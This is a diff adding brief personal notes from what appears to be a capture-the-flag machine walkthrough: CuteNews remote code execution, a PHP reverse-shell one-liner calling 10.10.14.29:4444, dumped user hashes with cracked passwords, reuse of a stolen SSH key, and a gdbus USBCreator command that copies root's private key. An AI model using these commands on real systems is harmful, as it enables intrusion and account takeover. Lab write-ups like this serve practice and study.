@@ -1,0 +1,42 @@
+-----------------------
+NOTES
+-----------------------
+
+
+-----------------------
+PROCESS
+-----------------------
+wget a page and find cutenews, there is an exploit al;ready out that has rce
+
+	php -r '$sock=fsockopen("10.10.14.29", 4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+looking throough the webapp, in the users dir, can find hashes from users
+
+USER HASHES:
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1  (paul)
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc:egre55
+
+su to paul to check his biz
+
+looking at ssh, seeing nadav in the authorized keys seems like the boyz share ssh keys
+
+can ssh into nadav using paul's id_rsa key
+	copy the id_rsa key to own machine
+	chmod 600 id_rsa
+	ssh -i id_rsa nadav@ip
+
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/id_rsa true
+
+creates an ssh key to log in as root
+can ssh -i key root@ip
+
+---------
+reflection
+---------
+happy to get this over with
+
+looking at .viminfo is not something i would think to do, important, can see potential scripts or something
+whatever the user is working on
